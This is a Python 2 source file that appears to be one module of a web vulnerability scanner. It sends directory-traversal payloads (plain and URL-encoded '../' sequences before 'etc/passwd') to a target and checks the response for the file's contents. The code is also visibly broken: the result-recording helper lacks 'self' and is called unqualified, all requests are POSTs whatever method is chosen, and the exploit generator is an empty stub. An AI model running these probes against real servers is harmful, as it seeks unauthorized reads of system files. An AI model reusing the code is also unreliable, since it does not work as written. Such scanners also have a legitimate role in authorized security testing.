import requests

class DirectoryTraversal(object):
	def __init__(self, target):
		self.target = target
		self.url = target['url']
		self.path = target['path']
		self.partial_path = target['scheme'] + "://" + target['domain']
		self.query = target['query']
		self.results = {}
		self.exploit_param = {}
		self.vulnerable = False
		if 'method' in target:
			if target['method']:
				method = target['method'].upper()
			else:
				method = 'POST'
			self.method = method
		else:
			self.method = 'GET'
	
	# https://www.owasp.org/index.php/Path_Traversal
	def scan(self):
		payloads = {'etc/passwd': 'systemd'}
		ups = ['../', '%2e%2e%2f', '%2e%2e%/', '..%2f', '..%c0%af']
		for payload, string in payloads.iteritems():
			for up in ups:
					for i in xrange(7):
						payload_string = '/' + (i*up) + payload
						if self.query:
							req = requests.post(self.partial_path + "?" + self.path + self.query.split('=')[0] + '=' + payload_string)
						else:
							req = requests.post(self.url + payload_string)
						if string in req.text:
							self.vulnerable = True
							print '[+] Directory Traversal Vulnerability: ' + self.path 
							self.exploit_param['url'] = payload_string
							add_scan_results()
						
		if self.vulnerable:
			return self.results 
		else:
			return None
			
	def add_scan_results():
		domain = self.partial_path
		if domain not in self.results:
			self.results[domain] = []

		result = {}
		result['endpoint'] = self.path
		result['params'] = self.exploit_param
		result['method'] = self.method
		self.results[domain].append(result)
			
		
		
		
	def generate_exploit(self, endpoint):
		pass